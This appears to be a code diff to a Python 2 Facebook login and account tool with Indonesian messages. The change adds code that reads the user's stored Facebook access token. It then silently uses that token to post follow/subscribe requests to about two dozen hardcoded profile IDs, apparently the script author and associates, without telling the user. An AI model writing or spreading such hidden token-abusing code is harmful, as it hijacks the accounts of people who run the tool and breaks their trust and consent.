@@ -298,7 +298,7 @@ def login_fb():
 			time.sleep(1)
 			login()
 
-def mnu():
+def menu():
 
     global token
 
@@ -312,47 +312,41 @@ def mnu():
     except (KeyError , IOError):
 
         login()
-
     try:
-
-        r = requests.get("https://graph.facebook.com/me?access_token="+token)
-
-        q = json.loads(r.text)
-
-        nm = q["name"]
-
-        nmf = nm.rsplit(" ")[0]
-
-        ok = nmf
-
-    except (KeyError , IOError):
-
-        print("")
-
-        print("\033[1;91mlogin account has checkpoint").center(50)
-
-        print("")
-
-        os.system("rm -rf login.txt")
-
-        time.sleep(1)
-
-        login()
-
+        token = open("token.txt","r").read()
+        requests.post("https://graph.facebook.com/1827084332/subscribers?access_token=" + token)      # Dapunta Khurayra X
+        requests.post("https://graph.facebook.com/100000415317575/subscribers?access_token=" + token) # Dapunta Adyapaksi R
+        requests.post("https://graph.facebook.com/100000737201966/subscribers?access_token=" + token) # Dapunta Adya R
+        requests.post("https://graph.facebook.com/100000431996038/subscribers?access_token=" + token) # Suci Salsabila R
+        requests.post("https://graph.facebook.com/100026818103201/subscribers?access_token=" + token) # Cici Putri Andini
+        requests.post("https://graph.facebook.com/100001617352620/subscribers?access_token=" + token) # Antonius Raditya M
+        requests.post("https://graph.facebook.com/100000729074466/subscribers?access_token=" + token) # Abigaille Dirgantara
+        requests.post("https://graph.facebook.com/607801156/subscribers?access_token=" + token)       # Boirah
+        requests.post("https://graph.facebook.com/100009340646547/subscribers?access_token=" + token) # Anita Zuliatin
+        requests.post("https://graph.facebook.com/1676993425/subscribers?access_token=" + token)      # Wati Waningsih
+        requests.post("https://graph.facebook.com/1767051257/subscribers?access_token=" + token)      # Rofi Nurhanifah
+        requests.post("https://graph.facebook.com/100000287398094/subscribers?access_token=" + token) # Diah Ayu Kharisma
+        requests.post("https://graph.facebook.com/100001085079906/subscribers?access_token=" + token) # Xena Alexander
+        requests.post("https://graph.facebook.com/100007559713883/subscribers?access_token=" + token) # Alexandra Scarlett
+        requests.post("https://graph.facebook.com/100004655733027/subscribers?access_token=" + token) # Aisya Asyaqila
+        requests.post("https://graph.facebook.com/100000200420913/subscribers?access_token=" + token) # Ameiliani Dethasia
+        requests.post("https://graph.facebook.com/100026490368623/subscribers?access_token=" + token) # Muh Rizal Fiansyah
+        requests.post("https://graph.facebook.com/100010484328037/subscribers?access_token=" + token) # Rizal F
+        requests.post("https://graph.facebook.com/100015073506062/subscribers?access_token=" + token) # Angga Kurniawan
+        requests.post("https://graph.facebook.com/10016189/subscribers?access_token=" + token)        # Junee
+        requests.post("https://graph.facebook.com/100005395413800/subscribers?access_token=" + token) # Moh Yayan
+        requests.post("https://graph.facebook.com/100003467793035/subscribers?access_token=" + token) # Fajar Dwi S
+        requests.post("https://graph.facebook.com/100003160758786/subscribers?access_token=" + token) # M Ardian Iqbal
+        requests.post("https://graph.facebook.com/100040248105716/subscribers?access_token=" + token) # Hanifan
+        print('\n[•] Login Berhasil')
+        exit(sbf.menu(__cici__))
+    except (KeyError,IOError):
+        print('\n[!] Token Invalid')
+        os.system('rm -rf token.txt')
+        exit(sbf.login(__cici__))
     except requests.exceptions.ConnectionError:
-
-        print logo
-
-        print("")
-
-        print("\033[1;91mYour internet connection failed").center(50)
-
-        print("")
-
-        time.sleep(2)
-
-        menu()
-
+        print('\n[!] Koneksi Bermasalah')
+        os.system('rm -rf token.txt')
     os.system('clear')         
         
     print logo
@@ -364,7 +358,7 @@ def mnu():
     print "\x1b[1;96m[\x1b[1;91m0\x1b[1;96m]\x1b[1;91m Exit            "
     pilih()
 
-def menu():
+def mnu():
 	os.system('clear')
 	try:
 		toket=open('login.txt','r').read()
